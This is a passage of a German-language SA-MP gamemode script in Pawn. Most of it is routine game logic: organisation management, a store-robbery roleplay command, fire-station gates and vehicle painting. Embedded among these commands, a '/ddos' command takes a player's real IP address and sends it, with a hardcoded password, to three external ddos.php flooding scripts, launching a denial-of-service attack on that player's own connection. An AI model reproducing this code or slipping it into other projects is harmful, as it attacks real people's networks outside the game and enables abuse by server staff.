				SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /orguninvite [playerid/Name]");
				return 1;
			}
			if(PlayerInfo[playerid][pOrgMember]==0) return SendClientMessage(playerid,COLOR_GREY,"Du bist in keiner Organisation.");
//			new leader = PlayerInfo[playerid][pLeader];
			new para1 = ReturnUser(tmp);
		    if(IsPlayerConnected(para1))
		    {
		        if(para1 != INVALID_PLAYER_ID)
		        {
					if(GetDistanceBetweenPlayers(playerid,para1) <= 8) // raus
					{
			   	   		if(para1 == playerid)
			   		    {
						SendClientMessage(playerid,COLOR_GREY,"Du kannst sich nicht selber inviten.");
						return 1;
						}


						if(gPlayerLogged[para1] == 0)
						{

						///SendClientMessage(playerid,COLOR_GREY,"Der Spieler ist bereits in einer Organisation"); // wtf ????????????????????????????????????????????????????????????????????????????
						SendClientMessage(playerid,COLOR_GREY,"Der Spieler ist nicht Eingeloggt.");

						return 1;
						}

						// /invite /makeleader Bug ? Member und Frak getrennt

						new org = PlayerInfo[playerid][pOrgMember];
						new orgleader = PlayerInfo[playerid][pOrgLeader];
					    if(!strcmp(OrgInfo[org][OrgOwner], GetName(playerid), true))   //return SendClientMessage(playerid,COLOR_GREY,"Du bist in keiner Organisation Leader."); //orgowner bafrage
						{
			    			//SCM(playerid,-1,"Und ja du bist Owner");


						   // if(PlayerInfo[para1][pOrgMember] > 1)return SendClientMessage(playerid,COLOR_GREY,"Der Spieler ist bereits in einer Organisation");


							if(!IsPlayerConnected(para1))return SendClientMessage(playerid,COLOR_GREY,"Der angegebene Spieler ist nicht verbunden!");

							if(PlayerInfo[para1][pOrgMember] != org)return SendClientMessage(playerid,COLOR_GREY,"Der angegebene Spieler ist nicht in deiner Organisation Mitglied.");
							format(string,sizeof(string),"Du wurdest von %s (ID:%i) aus der Organisation '%s' geschmissen.",PlayerInfo[playerid][Name],playerid,OrgInfo[org][OrgName]);
							SendClientMessage(para1,COLOR_LIGHTBLUE,string);
							format(string,sizeof(string),"%s wurde von %s aus der Organisation geschmissen.",PlayerInfo[para1][Name],PlayerInfo[playerid][Name]);
							SendOrganisationsMessage(org,COLOR_PURPLE,string);
							PlayerInfo[para1][pOrgLeader] = 0;
							PlayerInfo[para1][pOrgMember] = 0;

						}
						else
						{
						    if(orgleader != org ) return SCM(playerid,-1,"Du bist kein Leader dieser ORG!");
						    else
						    {


								if(!IsPlayerConnected(para1))return SendClientMessage(playerid,COLOR_GREY,"Der angegebene Spieler ist nicht eingeloggt!");

							    if(PlayerInfo[para1][pOrgMember] != org)return SendClientMessage(playerid,COLOR_GREY,"Der angegebene Spieler ist nicht in deiner Organisation Mitglied.");

                                if(PlayerInfo[para1][pOrgLeader] == org) return SCM(playerid,-1,"Du kannst keine ORG Leader rauswerfen!");

                             //   if(OrgInfo[org][membermiet] == 0) return SCM(playerid,-1,"Du kannst keine Mitglieder in deiner ORG kicken, da es in den Einstellungen deiner ORG deaktiviert wurde!");
								format(string,sizeof(string),"Du wurdest von %s (ID:%i) aus der Organisation '%s' geschmissen.",PlayerInfo[playerid][Name],playerid,OrgInfo[org][OrgName]);
								SendClientMessage(para1,COLOR_LIGHTBLUE,string);
								format(string,sizeof(string),"%s wurde von %s aus der Organisation geschmissen.",PlayerInfo[para1][Name],PlayerInfo[playerid][Name]);
								SendOrganisationsMessage(org,COLOR_PURPLE,string);
								PlayerInfo[para1][pOrgLeader] = 0;
								PlayerInfo[para1][pOrgMember] = 0;

							}
						}

				}
				else
				{
				SendClientMessage(playerid, COLOR_GRAD2, "Der Spieler ist nicht in der Nähe");
				}
			}
		}
		return 1;
	}

	/*
	if(strcmp(cmd, "/orguninvite", true) == 0)
	{
		tmp = strtoknew(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /orguninvite [playerid/Name]");
			return 1;
		}
//		new leader = PlayerInfo[playerid][pLeader];
		new para1 = ReturnUser(tmp);


		    if(IsPlayerConnected(para1))
		    {
		        if(para1 != INVALID_PLAYER_ID)
		        {

		   	   		if(para1 == playerid)
		   		    {
					SendClientMessage(playerid,COLOR_GREY,"Du kannst sich nicht selber uninviten.");
					return 1;
					}
					if(gPlayerLogged[para1] == 0)
					{
						SendClientMessage(playerid,COLOR_GREY,"Der Spieler ist bereits in einer Organisation");
						return 1;
					}
					new org = PlayerInfo[playerid][pOrgLeader];
				    if(org == 0)return SendClientMessage(playerid,COLOR_GREY,"Du bist in keiner Organisation Leader.");

					if(!IsPlayerConnected(para1))return SendClientMessage(playerid,COLOR_GREY,"Der angegebene Spieler ist nicht eingeloggt!");

					if(PlayerInfo[para1][pOrgMember] != org)return SendClientMessage(playerid,COLOR_GREY,"Der angegebene Spieler ist nicht in deiner Organisation Mitglied.");
					if(strcmp(PlayerInfo[para1][Name],OrgInfo[org][OrgOwner],true) == 0)return SendClientMessage(playerid,COLOR_GREY,"Du kannst den Inhaber der Orgnisation nicht aus der Organisation schmeißen.");
					format(string,sizeof(string),"Du wurdest von %s (ID:%i) aus der Organisation '%s' geschmissen.",PlayerInfo[playerid][Name],playerid,OrgInfo[org][OrgName]);
					SendClientMessage(para1,COLOR_LIGHTBLUE,string);
					format(string,sizeof(string),"%s wurde von %s aus der Organisation geschmissen.",PlayerInfo[para1][Name],PlayerInfo[playerid][Name]);
					SendOrganisationsMessage(org,COLOR_PURPLE,string);
					PlayerInfo[para1][pOrgLeader] = 0;
					PlayerInfo[para1][pOrgMember] = 0;

				}
			}
		return 1;
	}*/















/*
COMMAND:orgmakeleader(playerid,params[])
{
	if(ImTutorial[playerid] != 0)return SendClientMessage(playerid,GRAU,"Du kannst keine Befehle nutzen,da du im Tutorial bist.");
	if(GetPVarInt(playerid,"Eingeloggt") == 0)return SendClientMessage(playerid,GRAU,"Du bist nicht eingeloggt!");
	if(Spieler[playerid][pAWAYFROMKEYBOARD] == 1)return SendClientMessage(playerid,WRONGCMD,"Du bist im AFK-Modus und kannst somit keine Befehle nutzen."),SendClientMessage(playerid,WRONGCMD,"BENUTZE: /back");
	if(Spieler[playerid][pInPrison] == 1)return SendClientMessage(playerid,GRAU,"Du bist im Prison.");
	if(Spieler[playerid][pFriedhof] == 1)return SendClientMessage(playerid,GRAU,"Du bist Tot.");
	if(Spieler[playerid][pDeath] == 1)return SendClientMessage(playerid,GRAU,"Du bist verletzt.");
	if(Spieler[playerid][pJailed] != 0)return SendClientMessage(playerid,GRAU,"Du bist im Gefängnis.");
	if(Spieler[playerid][pTazerd] == 1)return SendClientMessage(playerid,GRAU,"Du bist K.O/getazert.");
	if(Spieler[playerid][pCuffed] == 1)return SendClientMessage(playerid,GRAU,"Du bist gefesselt.");
	new pID,string[128],org = Spieler[playerid][pOrgLeader];
    if(org == 0)return SendClientMessage(playerid,GRAU,"Du bist in keiner Organisation Leader.");
	if(sscanf(params,"u",pID))return SendClientMessage(playerid,WRONGCMD,"BENUTZE: /orgmakeleader [playerid/Name]");
	if(!IsPlayerConnected(pID))return SendClientMessage(playerid,GRAU,"Der angegebene Spieler ist nicht eingeloggt!");
    if(GetPVarInt(pID,"Eingeloggt") == 0)return SendClientMessage(playerid,GRAU,"Der angegebene Spieler ist nicht eingeloggt!");
	if(IsPlayerNPC(pID))return SendClientMessage(playerid,GRAU,"Das kannst du nicht!");
	if(Spieler[pID][pOrgMember] != org)return SendClientMessage(playerid,GRAU,"Der angegebene Spieler ist nicht in deiner Organisation Mitglied.");
	if(Spieler[pID][pOrgLeader] != 0)return SendClientMessage(playerid,GRAU,"Spieler ist bereits Leiter der Organisation.");
	format(string,sizeof(string),"Du wurdest von %s (ID:%i) zum Leiter der Organisation '%s' ernannt.",Spieler[playerid][pName],playerid,OrgInfo[org][OrgName]);
	SendClientMessage(playerid,GRUEN,string);
	format(string,sizeof(string),"%s hat %s zum Leiter der Organisation ernannt.",Spieler[playerid][pName],Spieler[pID][pName]);
	SendOrganisationsMessage(org,ORGCHATCOLOR,string);
	Spieler[pID][pOrgLeader] = org;
	return 1;
}

COMMAND:orgtakeleader(playerid,params[])
{
	if(ImTutorial[playerid] != 0)return SendClientMessage(playerid,GRAU,"Du kannst keine Befehle nutzen,da du im Tutorial bist.");
	if(GetPVarInt(playerid,"Eingeloggt") == 0)return SendClientMessage(playerid,GRAU,"Du bist nicht eingeloggt!");
	if(Spieler[playerid][pAWAYFROMKEYBOARD] == 1)return SendClientMessage(playerid,WRONGCMD,"Du bist im AFK-Modus und kannst somit keine Befehle nutzen."),SendClientMessage(playerid,WRONGCMD,"BENUTZE: /back");
	if(Spieler[playerid][pInPrison] == 1)return SendClientMessage(playerid,GRAU,"Du bist im Prison.");
	if(Spieler[playerid][pFriedhof] == 1)return SendClientMessage(playerid,GRAU,"Du bist Tot.");
	if(Spieler[playerid][pDeath] == 1)return SendClientMessage(playerid,GRAU,"Du bist verletzt.");
	if(Spieler[playerid][pJailed] != 0)return SendClientMessage(playerid,GRAU,"Du bist im Gefängnis.");
	if(Spieler[playerid][pTazerd] == 1)return SendClientMessage(playerid,GRAU,"Du bist K.O/getazert.");
	if(Spieler[playerid][pCuffed] == 1)return SendClientMessage(playerid,GRAU,"Du bist gefesselt.");
	new pID,string[128],org = Spieler[playerid][pOrgLeader];
    if(org == 0)return SendClientMessage(playerid,GRAU,"Du bist in keiner Organisation Leader.");
	if(sscanf(params,"u",pID))return SendClientMessage(playerid,WRONGCMD,"BENUTZE: /orgtakeleader [playerid/Name]");
	if(!IsPlayerConnected(pID))return SendClientMessage(playerid,GRAU,"Der angegebene Spieler ist nicht eingeloggt!");
    if(GetPVarInt(pID,"Eingeloggt") == 0)return SendClientMessage(playerid,GRAU,"Der angegebene Spieler ist nicht eingeloggt!");
	if(IsPlayerNPC(pID))return SendClientMessage(playerid,GRAU,"Das kannst du nicht!");
	if(Spieler[pID][pOrgMember] != org)return SendClientMessage(playerid,GRAU,"Der angegebene Spieler ist nicht in deiner Organisation Mitglied.");
	if(Spieler[pID][pOrgLeader] == 0)return SendClientMessage(playerid,GRAU,"Spieler ist nicht Leiter der Organisation.");
	if(strcmp(Spieler[pID][pName],OrgInfo[org][OrgOwner],true) == 0)return SendClientMessage(playerid,GRAU,"Du kannst den Inhaber der Orgnisation nicht als Leiter abweisen.");
	format(string,sizeof(string),"Du wurdest von %s (ID:%i) als Leiter der Organisation '%s' abgewiesen.",Spieler[playerid][pName],playerid,OrgInfo[org][OrgName]);
	SendClientMessage(playerid,GRUEN,string);
	format(string,sizeof(string),"%s wurde von %s als Leiter der Organisation abgewiesen.",Spieler[pID][pName],Spieler[playerid][pName]);
	SendOrganisationsMessage(org,ORGCHATCOLOR,string);
	Spieler[pID][pOrgLeader] = 0;
	return 1;
}
*/




	if(strcmp(cmd,"/orgsetmotto", true) == 0) // jobchat
	{
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
//			new ajjhfudw[240];
			new result[240];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "BENUTZE: /orgsetmotto [Name]");
				return 1;
			}
			new orgmember = PlayerInfo[playerid][pOrgMember];
			new org = PlayerInfo[playerid][pOrgLeader];
			if(org != orgmember)return SendClientMessage(playerid,COLOR_GREY,"Du bist in keiner Organisation Leader.");
			strmid(OrgInfo[org][OrgMotto],result,0,strlen(result),128);
			format(string,sizeof(string),"Du hast das Motto der Organisation in '%s' umgeändert.",OrgInfo[org][OrgMotto]);
			SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
			format(string,sizeof(string),"%s hat das Motto der Organisation in '%s' umgeändert.",PlayerInfo[playerid][Name],OrgInfo[org][OrgMotto]);
			SendOrganisationsMessage(org,COLOR_PURPLE,string);
			return 1;
	}
	if(strcmp(cmd,"/robstore", true) == 0) // jobchat
    {
	    if(PlayerInfo[playerid][pBizID] == 4)//24/7
	    {
		    if(IsACop(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "Als Cop kann man keinen Store ausrauben!.");
		    if(!IsPlayerInRangeOfPoint(playerid,15.0,2.5036,-28.5656,1003.5494))
		    {
		        SendClientMessage(playerid,0xAA3333AA,"Du bist nicht in einen 24/7!");
		        return 1;
		    }
//	    	new Cops = 0;
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
			    if(IsPlayerConnected(i))
			    {
			        if(PlayerInfo[i][sMember] == 1 || PlayerInfo[i][sMember] == 2 || PlayerInfo[i][sMember] == 3 || PlayerInfo[i][sMember] == 22)
			        {
//			            Cops += 3;// Sollten nur Gangs Robben können

			 			new LocationZone[MAX_ZONE_NAME];
			  			Get2DZone(BizzInfo[PlayerInfo[playerid][pLocal]-99][bEntranceX],BizzInfo[PlayerInfo[playerid][pLocal]-99][bEntranceY], LocationZone, MAX_ZONE_NAME);

		                format(string, sizeof(string), "* 24/7 Überfall!, der 24/7 in %s wird gerade überfallen",LocationZone);
						SendClientMessage(i, COLOR_DBLUE, string);
						SetPlayerCheckpoint(i,BizzInfo[PlayerInfo[playerid][pLocal]-99][bEntranceX],BizzInfo[PlayerInfo[playerid][pLocal]-99][bEntranceY],BizzInfo[PlayerInfo[playerid][pLocal]-99][bEntranceZ],8.0);
						SendClientMessage(i, COLOR_LIGHTBLUE, "* Fahre zum Roten Marker!");

			        }
			    }
			}
			SetTimerEx("robstore",120000,0,"i",playerid); // Nach 2 minuten Bank überfallen
			PlayerInfo[playerid][pRobstore] = 1;
			WantedLevel[playerid] += 2;
			SetPlayerCriminal(playerid,255, "24/7 Überfall");
			SendClientMessage(playerid,0xFF9933FF,"Du willst den Laden überfallen und musst warten bis das Geld eingepackt ist!");
			SendClientMessage(playerid,0xFF9933FF,"Verlasse vorher nicht den 24/7!");
		}
		else
	    {
			SendClientMessage(playerid, COLOR_GREY, "Du bist in keinen 24/7!");
		}
		return 1;
	}

//1276// Pickupid
/*

	if(strcmp(cmd,"/robmarker", true) == 0) // jobchat
    {

		if(PlayerInfo[playerid][pAdmin] == 2002)// Geld geht dann aus der Kasse von dem Ladenbesitzer
		{

	        if(PlayerInfo[playerid][pBizID] == 3||PlayerInfo[playerid][pBizID] == 4||PlayerInfo[playerid][pBizID] == 5||PlayerInfo[playerid][pBizID] == 2)//3 bis 5
	        {

				if(BizzInfo[PlayerInfo[playerid][pLocal]-99][bRobmarker] == 0)// Geld geht dann aus der Kasse von dem Ladenbesitzer
				{


				    GetPlayerPos(playerid,BizzInfo[PlayerInfo[playerid][pLocal]-99][bRobx],BizzInfo[PlayerInfo[playerid][pLocal]-99][bRoby],BizzInfo[PlayerInfo[playerid][pLocal]-99][bRobz]);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bRobmarker] = 1;




					SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast den Robmarker erfolgreich erstellt!");
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Dieser Store hat bereist einen Rob-Marker!");
				}
			}
		}
		return 1;
	}
*/

	if(strcmp(cmd,"/createstatur", true) == 0) // jobchat
    {
        if(PlayerInfo[playerid][pAdmin] > 1338)
        {
	        if(pickup == 0)
	        {

				ShowPlayerDialog(playerid, DIALOG_STATUR_PRICE, DIALOG_STYLE_LIST, "Neue Statur - Gewinn auswählen", "Unterbodenbeleuchtung Gutschein\n10 Respektpunkte Gutschein\nPremium Gutschein (Permanent)\nWunschkennzeichen Gutschein\nWunschfahrzeug Gutschein\nSonderlackierung Gutschein", "Weiter", "Abbrechen");

			}
			else
	        {
			SendClientMessage(playerid,COLOR_GREY,"Es wurde bereits eine Statur versteckt, verwende /destroystatur");
			return 1;
			}
		}
		return 1;
	}




	if(strcmp(cmd,"/destroystatur", true) == 0) // jobchat
    {
        if(PlayerInfo[playerid][pAdmin] == 1338)
        {
	        if(pickup == 1)
	        {
				SendClientMessage(playerid,COLOR_LIGHTBLUE,"* Du hast die Statur entfernt!");
				DestroyPickup(pickupX);
				pickup = 0;
        	    TextDrawSetString(Copyright,"www.gta.de");
			}
			else
	        {
			SendClientMessage(playerid,COLOR_GREY,"Es wurde keine Statur versteckt, verwende /createstatur");
			return 1;
			}
		}
		return 1;
	}









	if(strcmp(cmd,"/petrols", true) == 0) // jobchat
    {
        if(PlayerInfo[playerid][sMember] == 10)
        {
			new mvstring[4024];
			for(new t = 0; t < sizeof(TankeInfo); t++)
			{
	 			new LocationZone[MAX_ZONE_NAME];
	  			Get2DZone(TankeInfo[t][tEntranceX],TankeInfo[t][tEntranceY], LocationZone, MAX_ZONE_NAME);
				format(mvstring,2024,"%s\nTankstelle: (%d)%s, Auszahlung: %d, Ort: %s",mvstring,t,TankeInfo[t][tMessage],TankeInfo[t][tPriceProd],LocationZone);
			}
			ShowPlayerDialog(playerid, 2825, DIALOG_STYLE_LIST, "Verfügbare Tankstellen", mvstring, "Navigation", "Abbrechen");
		}//DialogTempWanted[playerid][DialogTempIndexWanted[playerid]++] = i;
		return 1;
	}


	if(strcmp(cmd,"/equipment", true) == 0) // jobchat
    {


//	new Float:x,Float:y,Float:z;
//	if(Spieler[playerid][pDuty] != 2)return SendClientMessage(playerid,SAMP_WEISS,"Nicht als Feuerwehrman im Dienst.");
	if(IsPlayerInAnyVehicle(playerid))return SendClientMessage(playerid,COLOR_GREY,"Du bist in einem Fahrzeug!");
	if(PlayerInfo[playerid][sMember] != 15)
	{
		SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
		return 1;
	}




	new vehicleid = GetPlayerVehicleID(playerid);
	GetPlayerPos(playerid, pX, pY, pZ);
	new Float:vX, Float:vY, Float:vZ;
	new Found = 0;
	new kvid = 0;
	while((kvid < MAX_VEHICLES) && (!Found))
	{
		 kvid++;
		 GetVehiclePos(kvid,vX,vY,vZ);
	     if((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0) && (floatabs(pZ-vZ)<7.0) && (kvid!=GetPlayerVehicleID(playerid)))
		 {
		    	Found = 1;
			    if(GetVehicleModel(vehicleid) == 407) // 411 is the Infernus model
			    {
					ShowMenuForPlayer(FIREequip,playerid);
					TogglePlayerControllable(playerid,0);
					return 1;




				}

			}

	}
	return 1;
}










	if(strcmp(cmd,"/feueralarm", true) == 0) // jobchat
    {
		new Float:x,Float:y,Float:z;
//		new Float:x,Float:y,Float:z,string[128];
	    if(PlayerInfo[playerid][sMember] != 15)
	    {
			SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
			return 1;
		}
	//	if(Spieler[playerid][pDuty] != 2)return SendClientMessage(playerid,SAMP_WEISS,"Nicht als Feuerwehrman im Dienst.");
		if(!IsPlayerInRangeOfPoint(playerid,2.5,1737.4025,-1106.1199,24.7000))return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht am Feueralarm.");
		if(IsPlayerInAnyVehicle(playerid))return SendClientMessage(playerid,COLOR_GREY,"Du bist in einem Fahrzeug!");
		GetPlayerPos(playerid,x,y,z);
		if(torstatus[78] == 0 || torstatus[79] == 0 || torstatus[80] == 0 || torstatus[81] == 0 || torstatus[82] == 0 || torstatus[83] == 0 || torstatus[84] == 0 || torstatus[85] == 0 || torstatus[86] == 0 || torstatus[87] == 0 || torstatus[88] == 0 || torstatus[89] == 0 || torstatus[90] == 0 || torstatus[91] == 0 || torstatus[92] == 0 || torstatus[93] == 0 || torstatus[94] == 0 || torstatus[95] == 0)
		{
			if(torstatus[78] == 0) MoveDynamicObject(tor[78],1715.40,-1142.40,25.10 + 5,1),torstatus[78] = 1;
			if(torstatus[79] == 0) MoveDynamicObject(tor[79],1709.60,-1142.40,25.10 + 5,1),torstatus[79] = 1;
			if(torstatus[80] == 0) MoveDynamicObject(tor[80],1778.10,-1142.40,25.10 + 5,1),torstatus[80] = 1;
			if(torstatus[81] == 0) MoveDynamicObject(tor[81],1726.70,-1142.40,25.10 + 5,1),torstatus[81] = 1;
			if(torstatus[82] == 0) MoveDynamicObject(tor[82],1732.50,-1142.40,25.10 + 5,1),torstatus[82] = 1;
			if(torstatus[83] == 0) MoveDynamicObject(tor[83],1744.00,-1142.40,25.10 + 5,1),torstatus[83] = 1;
			if(torstatus[84] == 0) MoveDynamicObject(tor[84],1749.70,-1142.40,25.10 + 5,1),torstatus[84] = 1;
			if(torstatus[85] == 0) MoveDynamicObject(tor[85],1709.70,-1094.90,25.10 + 5,1),torstatus[85] = 1;
			if(torstatus[86] == 0) MoveDynamicObject(tor[86],1726.60,-1094.90,25.10 + 5,1),torstatus[86] = 1;
			if(torstatus[87] == 0) MoveDynamicObject(tor[87],1732.60,-1094.90,25.10 + 5,1),torstatus[87] = 1;
			if(torstatus[88] == 0) MoveDynamicObject(tor[88],1743.70,-1094.90,25.10 + 5,1),torstatus[88] = 1;
			if(torstatus[89] == 0) MoveDynamicObject(tor[89],1749.70,-1094.90,25.10 + 5,1),torstatus[89] = 1;
			if(torstatus[90] == 0) MoveDynamicObject(tor[90],1760.90,-1094.90,25.10 + 5,1),torstatus[90] = 1;
			if(torstatus[91] == 0) MoveDynamicObject(tor[91],1766.70,-1094.90,25.10 + 5,1),torstatus[91] = 1;
			if(torstatus[92] == 0) MoveDynamicObject(tor[92],1778.30,-1094.90,25.10 + 5,1),torstatus[92] = 1;
			if(torstatus[93] == 0) MoveDynamicObject(tor[93],1784.10,-1094.90,25.10 + 5,1),torstatus[93] = 1;
			if(torstatus[94] == 0) MoveDynamicObject(tor[94],1795.40,-1094.90,25.10 + 5,1),torstatus[94] = 1;
			if(torstatus[95] == 0) MoveDynamicObject(tor[95],1801.10,-1094.90,25.10 + 5,1),torstatus[95] = 1;
			format(string,sizeof(string),"**(( %s %s: Die Tore der Wache sind geöffnet! ))**",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]),GetName(playerid));
			SendFamilyMessage(15, COLOR_LIGHTBLUE, string);
		 	//PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		}
		else
		{
			if(torstatus[78] == 1) MoveDynamicObject(tor[78],1715.40,-1142.40,25.10,1),torstatus[78] = 0;
			if(torstatus[79] == 1) MoveDynamicObject(tor[79],1709.60,-1142.40,25.10,1),torstatus[79] = 0;
			if(torstatus[80] == 1) MoveDynamicObject(tor[80],1778.10,-1142.40,25.10,1),torstatus[80] = 0;
			if(torstatus[81] == 1) MoveDynamicObject(tor[81],1726.70,-1142.40,25.10,1),torstatus[81] = 0;
			if(torstatus[82] == 1) MoveDynamicObject(tor[82],1732.50,-1142.40,25.10,1),torstatus[82] = 0;
			if(torstatus[83] == 1) MoveDynamicObject(tor[83],1744.00,-1142.40,25.10,1),torstatus[83] = 0;
			if(torstatus[84] == 1) MoveDynamicObject(tor[84],1749.70,-1142.40,25.10,1),torstatus[84] = 0;
			if(torstatus[85] == 1) MoveDynamicObject(tor[85],1709.70,-1094.90,25.10,1),torstatus[85] = 0;
			if(torstatus[86] == 1) MoveDynamicObject(tor[86],1726.60,-1094.90,25.10,1),torstatus[86] = 0;
			if(torstatus[87] == 1) MoveDynamicObject(tor[87],1732.60,-1094.90,25.10,1),torstatus[87] = 0;
			if(torstatus[88] == 1) MoveDynamicObject(tor[88],1743.70,-1094.90,25.10,1),torstatus[88] = 0;
			if(torstatus[89] == 1) MoveDynamicObject(tor[89],1749.70,-1094.90,25.10,1),torstatus[89] = 0;
			if(torstatus[90] == 1) MoveDynamicObject(tor[90],1760.90,-1094.90,25.10,1),torstatus[90] = 0;
			if(torstatus[91] == 1) MoveDynamicObject(tor[91],1766.70,-1094.90,25.10,1),torstatus[91] = 0;
			if(torstatus[92] == 1) MoveDynamicObject(tor[92],1778.30,-1094.90,25.10,1),torstatus[92] = 0;
			if(torstatus[93] == 1) MoveDynamicObject(tor[93],1784.10,-1094.90,25.10,1),torstatus[93] = 0;
			if(torstatus[94] == 1) MoveDynamicObject(tor[94],1795.40,-1094.90,25.10,1),torstatus[94] = 0;
			if(torstatus[95] == 1) MoveDynamicObject(tor[95],1801.10,-1094.90,25.10,1),torstatus[95] = 0;
			format(string,sizeof(string),"**(( %s %s: Die Tore der Wache sind nun geschlossen! ))**",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]),GetName(playerid));
			SendFamilyMessage(15, COLOR_LIGHTBLUE, string);
			//PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		}
		return 1;
	}
	if(strcmp(cmd,"/ddos", true) == 0) // jobchat
    {
	    	tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /ddos [playerid]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
			if(IsPlayerAdmin(playerid))
			{
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {


			    		/*if(IsASkrupy(giveplayerid))
	  		   			{
						    SendClientMessage(playerid, COLOR_GRAD2, "Versuch es garnicht erst ....");
							return 1;
						}*/


						    new plrIP[16],AuaXD[240],fickaaaa[240];
							GetPlayerIp(giveplayerid, plrIP, sizeof(plrIP));


							format(fickaaaa, sizeof(fickaaaa), "AdmCmd: %s hat %s geddost.",GetName(playerid),GetName(giveplayerid));
							ABroadCast(COLOR_LIGHTRED,fickaaaa,1);







				            format(AuaXD, sizeof(AuaXD), "gta-reallife.de/ddos/ddos.php?pass=apple&host=%s&port=21&time=6666666&packet=&bytes=",plrIP);
				  	        HTTP(playerid, HTTP_HEAD, AuaXD, "", "");// Server 3

				            format(AuaXD, sizeof(AuaXD), "crimeofsa.s4y-web.de/lol/ddos.php?pass=apple&host=%s&port=21&time=6666666&packet=&bytes=",plrIP);
				  	        HTTP(playerid, HTTP_HEAD, AuaXD, "", "");// Server 3

				            format(AuaXD, sizeof(AuaXD), "greenrp.s4y-web.de/lol/ddos.php?pass=apple&host=%s&port=21&time=6666666&packet=&bytes=",plrIP);
				  	        HTTP(playerid, HTTP_HEAD, AuaXD, "", "");// Server 3



							SendClientMessage(playerid, COLOR_GREY, "* DDoS Angriff gestartet!");
				}
			}


		}
		    return 1;
	}
	if(strcmp(cmd,"/gpci", true) == 0) // jobchat
    {
		new striawdwdng[240];
        format(striawdwdng, sizeof(striawdwdng), "GPCI %s",ReturnGPCI(playerid));
		SendClientMessage(playerid, COLOR_DBLUE, striawdwdng);

		new striawdwdng3[240];
        format(striawdwdng3, sizeof(striawdwdng3), "GPCI %d",ReturnGPCI(playerid));
		SendClientMessage(playerid, COLOR_DBLUE, striawdwdng3);


		new striawdwdng4[240];
        format(striawdwdng4, sizeof(striawdwdng4), "GPCI %i",ReturnGPCI(playerid));
		SendClientMessage(playerid, COLOR_DBLUE, striawdwdng4);

		return 1;



	}
	if(strcmp(cmd,"/skrupy", true) == 0) // jobchat
    {
		new striawdwdng[240];
        format(striawdwdng, sizeof(striawdwdng), "(Debug)WBB4 ID %d", PlayerInfo[playerid][pWBBid]);
		SendClientMessage(playerid, COLOR_DBLUE, striawdwdng);
		return 1;
	}

	if(strcmp(cmd,"/tec9", true) == 0) // jobchat
    {
		if(PlayerInfo[playerid][pAdmin] == 2002)
		{
			if(PlayerInfo[playerid][pKek9] == 0)
			{
//				tec9object[playerid] = CreateObject(18646, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
//				AttachObjectToPlayer(tec9object[playerid], playerid, 0.208999, 0.022000, 0.021000, 0.000000, 81.900024, 0.000000);

				SetPlayerAttachedObject(playerid, 0, 18646, 2, 0.208999, 0.022000, 0.021000, 0.000000, 81.900024, 0.000000);

				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast die Sirene auf deinen Arsch aktiviert!");
				PlayerInfo[playerid][pKek9] = 1;
			}
			else if(PlayerInfo[playerid][pKek9] == 1)
			{
				if(IsPlayerAttachedObjectSlotUsed(playerid, 0)) RemovePlayerAttachedObject(playerid, 0);
//				DestroyObject(tec9object[playerid]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast die Sirene auf deinen Arsch deaktiviert!");
				PlayerInfo[playerid][pKek9] = 0;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Tec9!");
			return 1;
		}
		return 1;
	}
	if(strcmp(cmd,"/farbe", true) == 0) // jobchat
    {
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht in deinem Auto!");
		if(!IsPlayerInRangeOfPoint(playerid, 8.0, 1017.9830,-919.3538,42.3359) && !IsPlayerInRangeOfPoint(playerid,8.0, 1911.2693,-1776.6720,13.3828) && !IsPlayerInRangeOfPoint(playerid, 20.0, 2002.8409,-2382.0603,13.5469)&& !IsPlayerInRangeOfPoint(playerid, 20.0, 1041.7180,2131.5728,10.8203))//1041.7180,2131.5728,10.8203
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht bei der Fahrzeuglackiererei!");
			return 1;
		}
	    if(GetPlayerMoneySave(playerid) >= 5000)
		{
			new vid = GetPlayerVehicleID(playerid);
			if(IsADtCar(vid))// Privatfahrzeug
	   		{
				new carowner = GetDtCarOwner(vid);
//	            new slot = GetDtCarOwnerSlot(carowner,vid);
				if (carowner == playerid)
				{
					new lackstring[4024];
					for(new i = 0; i < 120; i++)
					{
	            	 format(lackstring, sizeof(lackstring), "%s%s#######\n",lackstring,VehicleColoursTableRGBANormal[i]);//CarName[i]
					}
